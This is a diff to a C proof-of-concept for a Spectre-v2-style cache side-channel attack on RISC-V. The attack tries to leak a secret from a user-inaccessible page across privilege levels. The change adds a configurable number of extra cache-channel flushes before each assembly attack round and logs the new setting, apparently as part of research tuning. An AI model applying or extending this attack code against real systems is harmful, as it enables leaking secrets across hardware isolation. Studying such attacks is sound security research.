@@ -85,6 +85,10 @@
 #define V2_BYTE_WARMUP_ROUNDS 0
 #endif
 
+#ifndef V2_EXTRA_CHANNEL_FLUSHES
+#define V2_EXTRA_CHANNEL_FLUSHES 0
+#endif
+
 #ifndef V2_ASM_CONTROL_ROUND
 #define V2_ASM_CONTROL_ROUND 0
 #endif
@@ -784,7 +788,7 @@ static U_TEXT void svc_attack(char *addr)
 }
 #endif
 
-#if !V2_ASM_ROUND || V2_PROBE_CONTROL_ROUND
+#if !V2_ASM_ROUND || V2_PROBE_CONTROL_ROUND || V2_EXTRA_CHANNEL_FLUSHES > 0
 static U_TEXT void svc_flush_channel(volatile uint8_t *probe)
 {
 #if DIRECT_SERVICE_CALL
@@ -875,6 +879,11 @@ static U_TEXT void read_byte(char *addr_to_read, uint64_t len)
       if (elapsed <= active_threshold)
         control_hits[mixed_i]++;
     }
+#endif
+
+#if V2_EXTRA_CHANNEL_FLUSHES > 0
+    for (uint64_t flush = 0; flush < V2_EXTRA_CHANNEL_FLUSHES; ++flush)
+      svc_flush_channel(channel);
 #endif
 
     svc_v2_round_asm(addr_to_read, channel);
@@ -1062,7 +1071,7 @@ int main(void)
     active_threshold = CACHE_HIT_THRESHOLD;
 #endif
 
-  printf("[v2-privilege] model=%s attacker=%s victim=M isolation=%s secret=PTE_U0 pmp=permissive-not-boundary satp=%s service=%s round=%s fixed_marker=%d secret_offset=%d secret_sz=%d candidates=%d tries=%d train=%d warmup=%d asm_control=%d probe_control=%d probe_mix=%d early_strict=%d asm_style=%d\n",
+  printf("[v2-privilege] model=%s attacker=%s victim=M isolation=%s secret=PTE_U0 pmp=permissive-not-boundary satp=%s service=%s round=%s fixed_marker=%d secret_offset=%d secret_sz=%d candidates=%d tries=%d train=%d warmup=%d extra_flush=%d asm_control=%d probe_control=%d probe_mix=%d early_strict=%d asm_style=%d\n",
          PAGE_TABLE_ATTACKER ? "sv39-pte-u-isolation" : "interface",
          ATTACKER_MPP == 0 ? "U" : "S",
          PAGE_TABLE_ATTACKER ? "Sv39-PTE-U0" : "none",
@@ -1071,8 +1080,9 @@ int main(void)
          V2_ASM_ROUND ? "asm-single-site" : "multi-ecall-c",
          V2_FIXED_MARKER, SECRET_OFFSET, SECRET_SZ, PROBE_CANDIDATES,
          V2_ATTACK_TRIES, V2_TRAINING_LOOPS, V2_BYTE_WARMUP_ROUNDS,
-         V2_ASM_CONTROL_ROUND, V2_PROBE_CONTROL_ROUND, V2_PROBE_MIX,
-         V2_EARLY_STOP_STRICT, V2_ASM_STYLE);
+         V2_EXTRA_CHANNEL_FLUSHES, V2_ASM_CONTROL_ROUND,
+         V2_PROBE_CONTROL_ROUND, V2_PROBE_MIX, V2_EARLY_STOP_STRICT,
+         V2_ASM_STYLE);
   printf("[v2-privilege] calibration fallback=%d measured=%lu threshold=%lu fixed=%d\n",
          CACHE_HIT_THRESHOLD, measured_threshold, active_threshold,
          USE_FIXED_CACHE_HIT_THRESHOLD);
